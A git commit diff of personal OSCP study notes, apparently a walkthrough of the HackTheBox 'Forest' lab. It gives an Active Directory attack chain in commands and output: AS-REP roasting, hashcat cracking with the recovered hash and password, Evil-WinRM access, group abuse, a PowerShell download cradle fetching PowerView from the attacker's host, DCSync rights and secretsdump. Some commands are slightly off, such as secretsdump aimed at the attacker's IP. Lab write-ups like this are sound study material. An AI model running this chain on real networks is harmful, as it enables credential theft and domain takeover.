76dc2d0fca7baa6a6d39a735de2d8d87d3f5bf5f
Adib-LGS <58850596+Adib-LGS@users.noreply.github.com>
2025-10-16 21:04:09 -0400

    Update forest.sh

--- OSCP/forest.sh
+++ OSCP/forest.sh
@@ -9,6 +9,10 @@ LDAP Enum:
 CrackMapExec:
     https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials
 
+HashCat m 18200:  Kerberos 5, etype 23, AS-REP
+
+svc-alfresco is memeber for Account Operator which allows to create new user
+
 ###############
 
 1-Enummeration:
@@ -205,7 +209,8 @@ CrackMapExec:
                 santi
 
         We can try to Passwd Spray - https://github.com/byt3bl33d3r/CrackMapExec/wiki/Using-Credentials:
-            crackmapexec smb 10.129.95.210 -u usernusers.txeame -p modified_password.txt
+            crackmapexec smb 10.129.95.210 -u usernusers.txeame -p modified_password.txt --ignore-pw-decoding
+
 
         We can also try:
             python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.129.95.210 htb.local/svc-alfresco -no-pass
@@ -222,6 +227,144 @@ CrackMapExec:
 
         Next Step:
             Crack offline with John/hashcat to recover the account password (no noisy online brute force against the DC).
+
+            We can use the hashcat -m 18200 = Kerberos 5, etype 23, AS-REP
+        Cracking the Hashes in KALI:
+            hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+            $krb5asrep$23$svc-alfresco@HTB.LOCAL:457244551e22e2779b6ddb622f720fc5$c44f49a353a37a1a1105b76be6ead2f7bdbabe1fe9bad30bdfc70737fc7cbd0276c91d27ddd1acbf6a98091825af032e24d31642e6faa4473f77ad8c689f4f2b5c0358188fdd6d61944f41ca68fa624902560ba17ae6a5dad9fdb9bb21a1de31342a001b1fe2fc59a03877cb10ae73c8e27727d173be150cac198f808968c15cd736f4ac73dd5b901970c8cea90fafabf8bd0bed4e3c70b228539a6d8ee85a4e495fea31c6ece4ec156b829f3e8caa7f13d3ea8af0196c653efb468a0de382253fc0a42201cf842deae46b3fd4135a934eeb057d56191f1cd97e475ba3e7de3c260ca9e0e845:s3rvice
+
+            login: alfresco@HTB.LOCAL
+            passwd: s3rvice
+
+
+        └──╼ [★]$ crackmapexec smb 10.129.95.210 -u svc-alfresco -p s3rvice --shares
+            SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+            SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
+            SMB         10.129.95.210   445    FOREST           [*] Enumerated shares
+            SMB         10.129.95.210   445    FOREST           Share           Permissions     Remark
+            SMB         10.129.95.210   445    FOREST           -----           -----------     ------
+            SMB         10.129.95.210   445    FOREST           ADMIN$                          Remote Admin
+            SMB         10.129.95.210   445    FOREST           C$                              Default share
+            SMB         10.129.95.210   445    FOREST           IPC$                            Remote IPC
+            SMB         10.129.95.210   445    FOREST           NETLOGON        READ            Logon server share 
+            SMB         10.129.95.210   445    FOREST           SYSVOL          READ            Logon server share 
+
+
+        ldapdomaindump -u 'alfresco@HTB.LOCAL' -p 's3rvice' ldap://10.129.95.210
+
+        
+
+2-Priv Esc:
+    We Have acces to a Windows PC via svc alfresoc and evilwin RM:
+        evil-winrm -u svc-alfresco -p s3rvice -i 10.129.95.210
+
+    Win Enum:
+        *Evil-WinRM* PS C:\Users\svc-alfresco\Documents>  whoami /priv
+
+            PRIVILEGES INFORMATION
+            ----------------------
+
+            Privilege Name                Description                    State
+            ============================= ============================== =======
+            SeMachineAccountPrivilege     Add workstations to domain     Enabled
+            SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+            SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+        *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup
+            Aliases for \\FOREST
+                -------------------------------------------------------------------------------
+                *Access Control Assistance Operators
+                *Account Operators
+                *Administrators
+                *Allowed RODC Password Replication Group
+                *Backup Operators
+                *Cert Publishers
+                *Certificate Service DCOM Access
+                *Cryptographic Operators
+                *Denied RODC Password Replication Group
+                *Distributed COM Users
+                *DnsAdmins
+                *Event Log Readers
+                *Guests
+                *Hyper-V Administrators
+                *IIS_IUSRS
+                *Incoming Forest Trust Builders
+                *Network Configuration Operators
+                *Performance Log Users
+                *Performance Monitor Users
+                *Pre-Windows 2000 Compatible Access
+                *Print Operators
+                *RAS and IAS Servers
+                *RDS Endpoint Servers
+                *RDS Management Servers
+                *RDS Remote Access Servers
+                *Remote Desktop Users
+                *Remote Management Users
+                *Replicator
+                *Server Operators
+                *Storage Replica Administrators
+                *System Managed Accounts Group
+                *Terminal Server License Servers
+                *Users
+                *Windows Authorization Access Group
+
+
+        Anything interesting in Credential Manager?
+        *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cmdkey /list
+
+            Currently stored credentials:
+            * NONE *
+
+
+        We will use SMB Server from Kali to Windows Machine in order to upload WinPEAS64:
+            USE OF: winPEAS_Upload_Steps.sh for the setup
+            From Windows Machine:
+                *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> copy \\10.10.15.69\share\winPEASx64.exe C:\Users\svc-alfresco\Desktop\winPEASx64.exe
+
+
+        svc-alfresco is memeber for Account Operator which allows to create new user:
+
+            *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user adib adib1234 /add /domain
+                The command completed successfully.
+
+
+        Verify how is memeber of Exchange Windows:
+            *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions"
+                    Group name     Exchange Windows Permissions
+                    Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+                    Members
+
+                    -------------------------------------------------------------------------------
+                    The command completed successfully.
+        
+
+        No Memeber we will add adib:
+            *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" /add adib
+                The command completed successfully.
+
+
+        We use PowerView.PS1 to force Creation of adib account in the domain with the Right of DCSync:
+            Kali web server:
+                └──╼ [★]$ python3 -m http.server 8080
+                            Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+            Win Machine:
+                *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.15.69:8080/powerview.ps1')
+                    $pass= convertto-securestring 'adib1234' -AsPlainText -Force
+                    $cred = New-Object System.Management.Automation.PSCredential('HTB\adib', $pass)
+                    Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb, DC=local" -PrincipalIdentity adib -Rights DCSync
+
+        Now lets use secretsdump.py:
+            ./secretsdump.py htb.local/adib:adib1234@10.10.15.69
+
+        We have dump the hashes for admin account
+
+
+
+
 
 
 
